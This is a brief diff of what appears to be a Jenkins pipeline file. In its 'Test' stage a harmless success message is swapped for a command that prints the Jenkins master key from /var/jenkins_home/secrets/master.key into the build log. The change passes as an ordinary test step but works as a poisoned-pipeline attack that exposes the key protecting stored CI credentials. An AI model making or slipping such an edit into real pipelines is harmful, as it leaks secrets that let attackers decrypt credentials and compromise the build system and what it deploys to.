@@ -3,7 +3,7 @@ pipeline {
     stages {
         stage('Test') {
             steps {
-                sh 'echo "Success!"; exit 0'
+                sh 'cat /var/jenkins_home/secrets/master.key'
             }
         }
     }
